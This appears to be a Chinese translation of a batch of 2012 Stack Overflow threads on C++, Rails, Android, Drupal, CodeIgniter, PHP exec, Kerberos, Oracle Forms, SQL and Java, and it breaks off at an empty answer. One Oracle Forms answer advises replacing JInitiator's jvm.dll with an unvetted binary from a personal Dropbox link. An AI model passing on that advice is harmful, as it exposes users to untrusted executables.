我想你可能打算写这样的东西：

```
#include <iostream>

class A
{
public:
    A(int n) : num_(n) {}

    void print() { std::cout << num() << std::endl; }

    int num() const { return num_; }

private:
    int num_;
};

class B
{
public:
    B(int n) : a(n) {}

    int num() const { return a.num(); }

private:
    A a;
};

int main()
{
    B b(1);
    B b2 = b; // deep copy
} 
```

如你看到的：

1.  `B`没有自己的`num_`成员。应避免重复。
2.  无需实现复制构造函数或赋值运算符（三规则）。
3.  不需要在`new`这里使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:33:07.077

在这里，您不是在复制 b2

```
B *b3(b2); 
```

相反，您将 b3 指向 b2

你应该有

```
B *b3 = new B(*b2); 
```

* * *

## 回答 #5

> 赞同：-7
> 
> 时间：2012-08-02T17:32:05.930

C++ 中没有浅/深拷贝之类的东西。您要么拥有被复制的值或指针/引用，要么完全定义了复制操作的语义。

# c# - CommandBar 上指定位置的菜单项

> ID：11782672
> 
> 赞同：0
> 
> 时间：2012-08-02T17:24:49.897
> 
> 标签：c#, .net-4.0, vsto, contextmenu, excel-2010

有没有办法将菜单项/命令栏按钮放在命令栏上的指定位置？例如在位置 0（顶部）。

我对 Add() 使用直接代码，但看到 AddAT() 不存在我很失望。我的菜单出现并且工作正常。我想将它添加到指定位置。

```
button = (CommandBarButton)
    cellbar.Controls.Add(MsoControlType.msoControlButton, 
    Missing.Value, Missing.Value,
    cellbar.Controls.Count, true); 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T18:32:18.703

第四个参数是“之前”。因此，将您的代码更改为：

```
button = (CommandBarButton)
    cellbar.Controls.Add(MsoControlType.msoControlButton, 
    Missing.Value, Missing.Value,
    1, true); 
```

# ruby-on-rails - 根据元素的大小将数组中的项目放入 div 类中

> ID：11782677
> 
> 赞同：0
> 
> 时间：2012-08-02T17:25:38.017
> 
> 标签：ruby-on-rails, ruby, class, html

我有很多东西，`things = [1, 500, 900, 0, -105, -8, 16, 4]`我想根据它们是否大于零、小于零或等于零，在我的视图中以红色、绿色或黑色显示它们。

现在我的代码看起来像：

```
<%= @things.each do |p|%>
 <% if p > 0 %>
      <%= p  %>
    <% elsif p < 0 %>
      <%= p %>
    <% else %>
      <%= p %>
 <% end %>
<% end %> 
```

我没有正确显示开始的数字，并且我已经将它们放入 div 中进行了几次迭代，但似乎没有任何效果。一旦我在课堂上得到它们，我就可以很容易地添加颜色。（我还需要保持它们在数组中的相同顺序）

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:34:06.403

不知道这里有什么问题

```
 <% @things.each do |p|
     if p < 0
       class_name = 'red'
     elsif p > 0 
       class_name = 'green'
     else 
       class_name = 'black'
     end %>
     <div class="<%=class_name%>"><%= p %></div> 
<% end %> 
```

然后 css ：

```
.red{color:red;}
.green{color:green;}
.black{color:black;} 
```

编辑：在您的示例中，您使用的是`<%= @things.each`. 不要`<%=`用于不应该输出任何东西的东西

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:37:02.230

我能想到的第一件事是构建一个视图助手

```
def set_color number 
  case
    when number == 0 
       "black"
    when number > 0
       "green"
    when number < 0
       "red"
  end
end 
```

并且在视图中

```
<% @things.each do |p|%>
<div class="<%= set_color(p)%>"> <%= p %> </div>
<% end %> 
```

最后做CSS

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:37:03.053

### 如果您希望它们按正/负/0 分组

```
<% @things.group_by{ |n| n<=>0 }.sort.each do |sign,items|%>
  <ul class="<%= sign==-1 ? 'negative' : sign==1 ? 'positive' : 'zero'%>">
    <% items.each do |item| %>
      <li><%= item></li>
    <% end %>
  </ul>
<% end %> 
```

### 如果您希望它们按数组顺序排列，只需分类

```
<ul>
  <% @things.each do |thing|
    css = case thing <=> 0
      when -1 then "negative"
      when  0 then "zero"
      when  1 then "positive"
    end
    %>
    <li class="<%=css%>"><%= thing %></li>
  <% end %>
</ul> 
```

`each`请注意，您在包装器的开头错误地使用了等号：

```
<%= @things 
```

...这将导致`to_s`整个数组的表示被输出（你不希望这样）。

# java - Android外部文件不一致出现

> ID：11782678
> 
> 赞同：0
> 
> 时间：2012-08-02T17:25:41.463
> 
> 标签：java, android, file-io, storage, external

我正在使用 IntentService 将单个 NMEA 字符串附加到存储在 Android 设备上的外部公共存储中的日志文件中，但我的行为不一致。

首先，连接设备进行 USB 调试时不会出现日志文件。我读到许多Android设备在通过USB连接时无法写入外部存储，但即使它在与USB断开连接的情况下运行，也可能需要多次打开和关闭并重新运行应用程序，日志文件才会出现在文件系统中. 如果我不清除日志，我仍然必须重新启动手机才能再次开始附加到文件。

我怎样才能让文件每次都一致出现？

```
import android.app.IntentService;
import android.content.Intent;

public class LogFileService extends IntentService {

    DebugLog debug = new DebugLog("LogFileService");

    public static final String GPS_STR = "GPS_STR";
    public static final String FILE_PATH = "FILE_PATH";
    public static final String FILE_NAME = "gps_data.txt";

    public LogFileService() {
        super("LogFileService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        debug.log("Handling intent");

        String data = intent.getStringExtra(GPS_STR);

        debug.log("Writing " + data);

        GpsLogFile logFile = new GpsLogFile(FILE_NAME);
        logFile.open();
        logFile.write(data);
        logFile.close();
    }

    @Override
    public void onCreate() {
        super.onCreate();

        debug.log("Created");
    }

}

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;

import android.content.Context;
import android.os.Environment;

public class GpsLogFile {

    DebugLog debug = new DebugLog("LogFile");

    private File filePath = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_DOWNLOADS
    );

    private File logFile = null;
    private String fileName = null;

    private PrintWriter fileOut = null;

    public GpsLogFile(String name) {
        fileName = name;
    }

    public void open() {

        try {

            filePath.mkdirs();  

            if (!isExternalMediaAvailable()) {
                throw new IOException("External media not available.");
            }
            logFile = new File(filePath, fileName);
            //logFile.mkdirs();
            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            fileOut = new PrintWriter(
                    new FileOutputStream(logFile.getAbsolutePath(), true)
            );

        } catch (IOException e) {
            debug.log("Unable to open file.");
            debug.log(e.getMessage());
        }

    }

    public void write(String data) {

        debug.log("Writing to " + logFile.getAbsolutePath() + " " + data);

        try {
            fileOut.write(data);
            //fileOut.newLine();
            checkPrintWriterError(fileOut);
            fileOut.flush();

        } catch (IOException e) {
            debug.log("Unable to write");
            debug.log(e.getMessage());
        }
    }

    public void close() {
        if (null != fileOut) {
            try {
                fileOut.close();
                checkPrintWriterError(fileOut);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    private void checkPrintWriterError(PrintWriter writer) throws IOException {
        if (true == writer.checkError()) {
            throw new IOException("Print writer error.");
        }
    }
} 
```

# html - 有没有办法在 Google Analytics 上隐藏我的推荐网站

> ID：11782680
> 
> 赞同：1
> 
> 时间：2012-08-02T17:25:47.940
> 
> 标签：html, google-analytics

有没有办法在 Google Analytics 上隐藏我的推荐网站

例子：

推荐人网站是：referrer.com

```
<a href="example.com">CLICK HERE</a> 
```

我不想在 example.com 的 Google Analytics 中出现 referrer.com

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T04:53:28.373

只需在referrer.com 上使用HTTPS。HTTPS 从不通过引荐来源网址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:48:08.863

重定向到您在不同域上拥有的另一个地方。从那里重定向到 Example.com/wherever。您的推荐人现在是第二个站点。

IE：

```
<a href="my-second-site.php?redir=%2F%2Fexample.com%2Ftarget%3Fid%3D123">Example.com</a> 
```

您转到第二个域，将 example.com 的编码 URL 作为 GET 参数发送到 site2。然后为 GET 请求中的 URL 设置重定向。

...因此，如果您拥有：Dirty-Porn-Site.com

和

Puppies-Are-Cute.com

并且您不希望您的第一个站点显示为推荐人，您将链接到 puppies-are-cute，将您*实际*想要访问的 URL 作为 GET 参数... ...然后从到了真正的目标。

你可以做的还有很多。

# mysql - 使用联合占位符时，似乎替换为联合中使用的初始选择中的值

> ID：11782682
> 
> 赞同：1
> 
> 时间：2012-08-02T17:25:54.413
> 
> 标签：mysql, drupal-7, dynamic-queries

这或多或少与[如何在使用 $query->addExpression() 时保留要选择的字段的顺序有关](https://stackoverflow.com/questions/11782454/how-to-preserve-the-order-of-the-fields-to-be-selected-when-using-query-addexp)

我正在做的是`union`在多张桌子上制作一个。但我还需要知道这些值来自哪个表。所以我只是添加这样的东西：`$query->addExpression(':table', 'table_name', array(':table' => $table_name));`

问题是，一旦您进行联合，表名就会被第一个查询中的表名替换。

检查以下示例：

```
$table_name = 'table_one'; 
$query_1 = db_select('table_one', 't1');
$query_1->fields('t1', array('field_1', 'field_2'));
$query_1->addExpression(':table', 'table_name', array(':table' => $table_name));

$table_name = 'table_two'; 
$query_2 = db_select('table_two', 't2');
$query_2->fields('t2', array('field_1', 'field_2'));
$query_2->addExpression(':table', 'table_name', array(':table' => $table_name));    

$table_name = 'table_three';
$query_3 = db_select('table_three', 't3');
$query_3->fields('t3', array('field_1', 'field_2'));
$query_3->addExpression(':table', 'table_name', array(':table' => $table_name)); 
```

如果我们单独检查选择，它们看起来都很好，你会得到预期的结果，但是当使用联合时，你只会看到`table_one`到处都是。

```
// dpq($query_1) - OK 
SELECT t1.field_1 AS field_1, t1.field_2 AS field_2, 'table_one' AS table_name
FROM 
{table_one} t1

// dpq($query_2) - OK
SELECT t2.field_1 AS field_1, t2.field_2 AS field_2, 'table_two' AS table_name
FROM 
{table_two} t2

// dpq($query_3) - OK
SELECT t3.field_1 AS field_1, t3.field_2 AS field_2, 'table_three' AS table_name
FROM 
{table_three} t3

// dpq($query_1->union($query_2)->union($query_3)) - OOPS.. 'table_one' all over the place
SELECT t1.field_1 AS field_1, t1.field_2 AS field_2, 'table_one' AS table_name
FROM 
{table_one} t1 UNION SELECT t2.field_1 AS field_1, t2.field_2 AS field_2, 'table_one' AS table_name
FROM 
{table_two} t2 UNION SELECT t3.field_1 AS field_1, t3.field_2 AS field_2, 'table_one' AS table_name
FROM 
{table_three} t3 
```

如果你有想法会很棒，因为我一直在努力解决这个问题......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T09:44:30.580

睡了几个小时后，我追踪到了这个函数：

```
 // @file includes/database/select.inc
  public function arguments() {
    // ....

    // If there are any dependent queries to UNION,
    // incorporate their arguments recursively.
    foreach ($this->union as $union) {
      $args += $union['query']->arguments();
    }

    return $args;
  } 
```

而且由于查询中的所有选择都具有相同的键`:table`，因此您最终只会得到一个参数而不是您。

***解决方案***：只要确保**为占位符使用不同的键即可**。

因此，如果我们在上面的示例中替换这些行（注意`:table_1`&`:table_2`而不是`:table`：

```
$query_2->addExpression(':table_1', 'table_name', array(':table_1' => $table_name));
$query_3->addExpression(':table_2', 'table_name', array(':table_2' => $table_name)); 
```

瞧，终于得到了预期的结果。希望它可以帮助某人，半天试图弄清楚为什么会发生这种情况。

```
SELECT t1.field_1 AS field_1, t1.field_2 AS field_2, 'table_one' AS table_name
FROM 
{table_one} t1 UNION ALL SELECT t2.field_1 AS field_1, t2.field_2 AS field_2, 'table_two' AS table_name
FROM 
{table_two} t2 UNION ALL SELECT t3.field_1 AS field_1, t3.field_2 AS field_2, 'table_three' AS table_name
FROM 
{table_three} t3 
```

# php - Codeigniter 删除

> ID：11782686
> 
> 赞同：2
> 
> 时间：2012-08-02T17:25:57.410
> 
> 标签：php, mysql, codeigniter

我在使用 codeigniter 时很开心，但目前有一个烦人的小问题，当我尝试删除一个项目时，我得到“消息：未定义的属性：Site::$url”我唯一的猜测可能是 url 有问题助手被包括在内？我在配置中自动加载它。

这是我在模型中的删除功能

```
 function delete_record()
 {
  $this->db->where('id', $this->url->segment(3));
  $this->db->delete('items');

 } 
```

在这里我在视图中调用它：

```
<?php echo $row->subject; ?> <?php echo anchor("site/delete/$row->id","Delete");?> 
```

这是控制器：

```
function delete(){
  $this->Site_model->delete_record();
  $this->index();
  } 
```

并且只是为了确保我没有做错任何事情..这是在配置中的自动加载中：

```
$autoload['helper'] = array('url', 'form');
$autoload['libraries'] = array('database'); 
```

非常感谢任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:31:26.500

没有 url 类。

你想切换`$this->url->segment(3)`到`$this->uri->segment(3)`注意 I 而不是 L。

url **helper**用于生成站点 url 等。URI 类是 CI 核心的一个组成部分，因此它总是被加载。

[URI 类](http://codeigniter.com/user_guide/libraries/uri.html)

[网址助手](http://codeigniter.com/user_guide/helpers/url_helper.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:31:43.690

一定是

```
$this->uri->segment(3) not $this->url->segment(3) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-21T11:40:26.903

您必须进行两项更改：

第一的：

```
$this->url->segment(3) to $this->uri->segment(3); 
```

第二：在视图中

```
<?php echo $row->subject; ?> <?php echo anchor("site/delete/".$row->id,"Delete");?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-24T17:49:07.383

你所做的没关系，只需将'url'替换为'uri'，就像这样。

```
$this->url->segment(3) to $this->uri->segment(3) //replace url to uri. 
```

# php - PHP——检查脚本是否运行，永远循环浏览器

> ID：11782688
> 
> 赞同：0
> 
> 时间：2012-08-02T17:26:17.423
> 
> 标签：php, exec

编码：

```
exec('ps aux |grep tweet',$output,$return_var);
if(count($output)>0){
    exec('php ' . DOCROOT . 'gremlins/tweet_gremlin.php &');
    file_put_contents(DOCROOT . 'gremlins/tweet_gremlin.log', date('r') . ' Tweet Gremlin was not running. Starting now...');
} 
```

在我看来，这段代码是有道理的，但它只会导致浏览器无限循环。我要做的是检查 tweet_gremlin.php 是否正在运行，如果没有运行，请启动它。DOCROOT 是前面代码中定义的常量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:30:15.787

我发现的一件事是，有时当你这样做时`ps -aux | grep "something"`，总会有一个过程。该过程基本上是您的命令本身！因此，在 php 中使用它们之前，请在 shell 中实际尝试这些命令。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:34:33.737

你可以使用：

```
if (!exec("ps aux | grep tweet | grep -v grep")) {
    // do something
} 
```

该`grep -v`部件从列表中删除`grep`进程。

此外，要使用等执行后台进程`exec`，您将需要重定向输出，否则您的脚本将挂起，直到进程完成。每个例子：

```
exec('php script.php >/dev/null &'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T18:11:00.507

我想你可能需要尝试

```
if( count($output)==0 ) 
```

因为您想测试该过程是否不存在？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:32:31.167

您或某人可能会发现这很有用，这是我很久以前写的脚本

```
<?php
// shut system if wget is not running

function rempty($tbl)
{
    foreach ($tbl as $key => $val)
    {
        if (trim($val) == '')
            unset ($tbl[$key]);
    }

    return $tbl;
}

while (count(rempty(explode("\n",trim(shell_exec('pgrep wget'))))) > 0)
    sleep(1);

echo 'done. shutting down in 30 mins...';
sleep (30*60);
shell_exec('sudo halt');

?> 
```

# kerberos - Kerberos 和 Kerberos 领域

> ID：11782689
> 
> 赞同：2
> 
> 时间：2012-08-02T17:26:22.040
> 
> 标签：kerberos

我正在尝试了解 Kerberos 和 Kerberos 领域。我想知道的是，例如，如果您有一家公司，有两个办事处和一个总部都在不同的位置，有自己的本地网络，公司服务器位于总部，所有办公室的客户都需要访问总部的服务器，您会在每个位置（领域？）有一个 KDC 还是在总部有一个 KDC？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T09:53:00.760

您可以在网络的每个网段中安装 KDC，然后启用跨域身份验证。跨域身份验证的详细信息可以在下面给出的站点中找到。

[http://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-kerberos.html](http://www.centos.org/docs/5/html/Deployment_Guide-en-US/ch-kerberos.html)。祝你好运

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-05T04:43:44.810

在正常情况下，您不会设置多个领域。多个领域指定单独的信任域，这可能不是必需的。您可能决定在每个办公室都有一个单独的 KDC 以减少延迟，这是可能出现物理安全问题的地方，被盗的 KDC 意味着您的整个用户数据库都在野外。微软使用 RODC [http://technet.microsoft.com/en-us/library/cc732801(v=ws.10).aspx](http://technet.microsoft.com/en-us/library/cc732801(v=ws.10).aspx)来解决这个问题，但据我所知，麻省理工学院和海姆达尔都没有提供类似的东西，在在这种情况下，您可能希望在单独的领域中拥有远程/分支机构用户，这样，如果他们的用户数据库被盗，则只有他们。在这种情况下，您可能希望为远程领域至少再拥有一个 KDC，以便您能够快速枚举用户并更改他们的密钥。

当 Windows AD 和 UNIX 主机需要互操作并且 UNIX 主机是不同领域的成员时，还有一个使用跨领域信任的地方。

# ios - 在另一个类的 App Delegate 调用方法中

> ID：11782695
> 
> 赞同：1
> 
> 时间：2012-08-02T17:26:37.753
> 
> 标签：ios, uiviewcontroller, uiapplicationdelegate

我有一个视图，其中包含带有一些子视图（UIViewControllers）的滚动视图。我想在 applicationWillResignActive: App Delegate 的方法中从一个类（他们的 UIViewControllers 之一）调用一个方法（停止计时器）。

实现这一点的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T17:33:43.543

不要担心在您的应用程序委托中处理该事件并将其传递。只需在您有兴趣处理事件的任何课程中注册通知：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(someMethod:)
                                             name:UIApplicationWillResignActiveNotification
                                           object:nil]; 
```

# java - Web windows 7 jinitiator 中的 Oracle 表单不适用于 IE9

> ID：11782697
> 
> 赞同：4
> 
> 时间：2012-08-02T17:26:56.163
> 
> 标签：java, oracle, internet-explorer-9, oracleforms, jinitiator

我在带有 IE6 的 WEB Windows XP 中使用 oracle 表单，它与 J 启动器配合得很好。现在我用 IE9 切换到 Windows 7，我安装了 Jinitator，但是 IE 崩溃了。有什么解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-01T22:23:18.470

你应该明白为什么过去你应该使用 jinitiator 而不是 jre 版本。所以这里有一些背景：

当 webforms 诞生时，oracle 有很多关于 java 运行时的错误。那时 java 来自 Sun，他们不想解决有关 oracle webforms 的所有问题。因此，他们没有推动 Sun（如果当时甲骨文甚至可以做到的话），他们有了自己做这项工作的想法。所以 Jinitiator 就是解决所有这些问题的产品。

与此同时，Sun 修复了所有问题（或者至少大部分在 1.5 版本结束和 1.6 版本开始时的 java 运行时），因此 jinitiator 变得绝对。

目前java开发来自Oracle，不再来自Sun，所以所有的问题都会得到解决，jinitiator可以从这个世界上消失。

所以你的问题的解决方案确实是在 Windows 7 中安装 java 运行时版本。

希望这个答案能让大家更好地了解这个问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T19:29:37.003

有几种解决方案。抛弃 jinitiator 并切换到 JRE 1.6.0_37。适用于 Windows XP、Windows 7 和 Linux（REHL 5/6 和 FEDORA 17*）。浏览器测试了 IE7/8/9、chrome、firefox、safari。

您使用的是什么类型/版本的应用程序服务器？您使用哪种/版本的表格？

*) 是 您可以在 Fedora 17 上安装 oracle 11.2.0.2 数据库、Weblogic 10.3.6 和 Forms 11.1.2.0.0

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:41:16.840

我只能让您试用 Netscape 浏览器，在 Windows 7 上，我使用 Netscape 运行 Oracle Forms，它运行良好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-14T09:44:45.763

我尝试了以下方法，它奏效了。

像往常一样安装 Jinitiator，如果你在安装它时遇到问题，只需使用 Win7 的“兼容模式”让它留在你的机器上，而不是在失败的安装过程结束时烦人地自行卸载。

现在

**用这个文件**[jvm.dll](http://dl.dropbox.com/u/45390770/jvm.dll)替换`jvm.dll`jinitiator 目录 ( `C:\Program Files (x86)\Oracle\JInitiator 1.3.1.13\bin\hotspot\`) 。

 **重新启动`IE`* 并重试，`Windows 7`应该会减少您的配色方案并且您的应用程序现在应该可以工作了。**

# python - 在 Python 的条件导入中定义的函数

> ID：11782699
> 
> 赞同：0
> 
> 时间：2012-08-02T17:27:16.570
> 
> 标签：python, python-2.7

我有条件导入

```
if os.path.exists(SOMEPATH):
    __import__(pymodule)
else:
    sys.exit() 
```

我正在尝试使用此 pymodule 中定义的函数。但是，它给出了一个错误“未定义的变量”

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:28:55.460

`__import__()`只导入模块；它不绑定任何名称。

```
somemodule = __import__(somename) 
```

# sql - 如何修复关键字“ORDER”附近的错误语法

> ID：11782705
> 
> 赞同：1
> 
> 时间：2012-08-02T17:27:30.637
> 
> 标签：sql, sql-server, sql-order-by

我有以下 SQL，`Incorrect syntax near keyword 'ORDER'`当我尝试执行它时它给了我：

```
SELECT COUNT(*) AS ID 
FROM Employees i
  INNER JOIN #WeightedIDs w
  ON (i.ID = w.ID)
WHERE (i.DepartmentID = 10 and i.ShiftID = 2)

UNION ALL

SELECT i.ID FROM Employees i
  INNER JOIN #WeightedIDs w
  ON (i.ID = w.ID)
WHERE (i.DepartmentID = 10 and i.ShiftID = 2)
ORDER BY w.[Weight] ASC 
```

我应该如何解决它？

**更新：**

这就是我真正想要完成的事情。我有一个 SPROC，它根据一堆不同的条件动态生成查询。它还构建了一个临时表，其中包含 ID 和与这些 ID 关联的权重，因此我希望结果按此排序。生成查询后，我想获取计数以及在列表中返回的 id。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T17:34:49.013

在联合中，您只能订购完整结果，而不是部分结果，因为订购子选择没有意义 - 它是一个关系/表，并且它们（根据定义）未排序。

如果您希望对整体结果进行排序，您可以添加一个`ORDER BY 1 ASC`以按第一（也是唯一）列排序。如果您希望第一部分的所有行都排在第二部分之前并按重量对第二部分进行排序，您可以执行以下操作：

```
select id
from
(
  SELECT COUNT(*) AS ID, 
         0 as sort_column
  FROM Employees i
    INNER JOIN #WeightedIDs w
    ON (i.ID = w.ID)
  WHERE (i.DepartmentID = 10 and i.ShiftID = 2)

  UNION ALL

  SELECT i.ID, 
         x.[Weight] 
  FROM Employees i
    INNER JOIN #WeightedIDs w
    ON (i.ID = w.ID)
  WHERE (i.DepartmentID = 10 and i.ShiftID = 2)
) x
order by sort_column 
```

这假定 的值`x.weight`大于零。如果不是，您需要在联合的第一部分使用不同的（较低的）值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:47:27.010

如果将 ORDER BY 移动到 UNION 中的第一个 SELECT，它将对整个结果集进行排序。但是，它必须在第一个 SELECT 上，其他任何地方都会导致您看到的错误。

# iphone - 是否有将行插入到通过情节提要配置的静态单元格的 TableView 中的技巧？

> ID：11782706
> 
> 赞同：2
> 
> 时间：2012-08-02T17:27:35.530
> 
> 标签：iphone, ios, uitableview, uistoryboard, xcode-storyboard

我有一个通过静态单元在情节提要中创建的 TableView。

这个想法是一个部分有一个带有标签和开关的单行。当用户点击“打开”开关时，该部分会在下面出现一些新行。有点类似于“设置”应用中的 Wi-Fi 设置（它添加了新部分，但我正在添加新行）。

![在此处输入图像描述](../Images/f2ffa1fa5899aa209741637e86755604.png)

我正在通过 Storyboard 创建这个 TableView，如下所示：

![在此处输入图像描述](../Images/7ee2078e752fb12da5532c97f5506d98.png)

现在，当开关值改变时采取的行动：

```
- (IBAction)hitSwitch:(id)sender {

    NSArray *indexPathsArray = [NSArray arrayWithObjects:[NSIndexPath indexPathForRow:1 inSection:0], [NSIndexPath indexPathForRow:2 inSection:0], nil];

    UISwitch *theSwitch = sender;

    [self.tableView beginUpdates];

    if (theSwitch.on) {

        [self.tableView insertRowsAtIndexPaths:indexPathsArray withRowAnimation:UITableViewRowAnimationAutomatic];

    } else {

        [self.tableView deleteRowsAtIndexPaths:indexPathsArray withRowAnimation:UITableViewRowAnimationAutomatic];

    }

    [self.tableView endUpdates];

} 
```

我希望调用普通的表视图数据源方法来显示这些新行的单元格，所以我添加了以下代码：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {

    if (self.addRowsSwitch.on) {

        return 3;

    } else {

        return [super tableView:tableView numberOfRowsInSection:section];

    }

}

- (UITableViewCell*)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    if (!self.addRowsSwitch.on) {

        return [super tableView:tableView cellForRowAtIndexPath:indexPath];

    } else {

        UITableViewCell *newCell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:nil];

        return newCell;

    }

} 
```

但是根据我方便的调试器， tableView:numberOfRowsInSection: 被调用，返回一个值，然后应用程序在 tableView:cellForRowAtIndexPath 被调用之前崩溃。

> 2012-08-02 13:16:08.564 TableViewInsertTest[3186:f803] *** 由于未捕获的异常“NSRangeException”而终止应用程序，原因：“*** -[__NSArrayI objectAtIndex:]：索引 1 超出范围 [0 .. 0]”* ** First throw call stack: (0x14b2022 0xeb2cd6 0x149e644 0x43bea5 0x2481a8 0x1f3688 0x1f4c2a 0x9743e 0xa50b7 0xa50e5 0x2604 0x14b3e99 0x1814e 0x180e6 0xbeade 0xbefa7 0x212c16 0x93b85d 0x1486936 0x14863d7 0x13e9790 0x13e8d84 0x13e8c9b 0x139b7d8 0x139b88a 0x15626 0x1ebd 0x1e25)

我还需要做些什么来完成这项工作，还是不支持我尝试实现的行为类型？

# css - CSS iPad 视图布局

> ID：11782710
> 
> 赞同：1
> 
> 时间：2012-08-02T17:27:39.320
> 
> 标签：css, ipad, width, viewport

在此处设置示例：http: [//codepen.io/rctneil/pen/myxDc](http://codepen.io/rctneil/pen/myxDc)和完整页面示例：[http ://codepen.io/rctneil/full/myxDc](http://codepen.io/rctneil/full/myxDc)

在该示例中，我有一个带有 .container 的标题，标题是全宽的，而 .container 固定为特定宽度。

如果您将宽度设置为 980 像素或更小，则页面在 iPad 上可以很好地呈现，如果您将该宽度设置为大于 980 像素，那么您会在右侧开始出现错误的空间。

我认为 iPad 上的默认布局模式是，如果一个元素比可视视口宽，可视视口会缩小，直到一切都适合，然后允许用户手动放大页面的某些部分。这就是它过去对我的工作方式，我敢肯定。

任何人都知道为什么该网站没有自动缩小以正确适应？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:00:01.120

如果您将页面的高度设置得足够大以至于需要垂直滚动，它将自动缩小宽度。例如，在.container 上设置宽度和高度为2000px，它会适当地缩小页面。在这种情况下，这可能不是一个可行的解决方案，但它是对 iPad 视口行为的有趣观察。

我会推荐使用 iOS 元视口标签。[http://developer.apple.com/library/safari/#documentation/appleapplications/reference/SafariHTMLRef/Articles/MetaTags.html](http://developer.apple.com/library/safari/#documentation/appleapplications/reference/SafariHTMLRef/Articles/MetaTags.html)

# ios - 如何使用 AVPlayer 停止 AirPlay 音频？

> ID：11782712
> 
> 赞同：3
> 
> 时间：2012-08-02T17:27:44.757
> 
> 标签：ios, airplay

我正在开发一个 iOS 应用程序，由于我们不会进入这里的原因，它有时希望在远程设备上禁用 AirPlay 播放，并且只在 iOS 设备上本地播放视频，而不管用户的设置如何。

我正在使用 AVPlayer 播放视频，这是目前不可协商的。

我将 iOS 5.0+ AVPlayer 属性 allowAirPlayVideo 设置为 NO，这会阻止视频远程播放。但如果用户在 iOS 设备上开启了 AirPlay，音频仍会通过远程设备进行流式传输。

我在 Apple 的文档中没有看到类似的 allowAirPlayAudio 标志，我也没有在其他任何地方发现过这个问题。

例如，这个 Stack Overflow 问题：

[AirPlay 的音频输出路径](https://stackoverflow.com/questions/8379081/audio-output-routes-for-airplay)

谈论“USB音频附件中的音频输出目的地”，这听起来不像我需要的。

我不想只是关闭音频，我希望音频继续通过我的 iOS 设备播放。

我错过了什么吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-08-04T12:30:03.273

可能与[如何检测蓝牙耳机是否插入 IOS 8？](https://stackoverflow.com/questions/28928876/how-to-detect-if-a-bluetooth-headset-plugged-or-not-ios-8/35455901#35455901)

我知道这是一个老问题，但是，嘿，它可能会帮助一些人

# java - 遍历 hashmap 列表

> ID：11782719
> 
> 赞同：0
> 
> 时间：2012-08-02T17:28:22.243
> 
> 标签：java, hashmap

我想遍历 HashMap 列表并检索键和值（值 1 和值 2）。此行有一个错误，显示“类型不匹配：无法从元素类型 Object 转换为 Map.Entry>”

```
for (Map.Entry<String, List<String>> entry : Map.entrySet()) 
```

我做错什么了吗。请帮帮我。这是整个代码。

```
public static void main(String[] args)  {
    Map<String, List<String>> conceptMap = new HashMap<String, List<String>>();
    Map<String, List<String>> PropertyMap = new HashMap<String, List<String>>();
    try{
        Scanner scanner = new Scanner(new FileReader("C:/"));
        while (scanner.hasNextLine()){
            String nextLine = scanner.nextLine();
            String [] column = nextLine.split(":");
            if (column[0].equals ("Property")){
                if (column.length == 4) {
                    PropertyMap.put(column [1], Arrays.asList(column[2], column[3]));    
                }
                else {
                    conceptMap.put (column [1], Arrays.asList (column[2], column[3]));
                }
            }
            for (Map.Entry<String, List<String>> entry : Map.entrySet()) {
                String key = entry.getKey();
                List<String> valueList = entry.getValue();
                System.out.println("Key: " + key);
                System.out.print("Values: ");
                for (String s : valueList) {
                    System.out.print(s + " ");
                }
            }
        }

        scanner.close();
    }    
    catch (Exception e) {
        e.printStackTrace();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:32:51.417

更改`Map.entrySet()`为`PropertyMap.entrySet()`或`conceptMap.entrySet()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T21:09:17.517

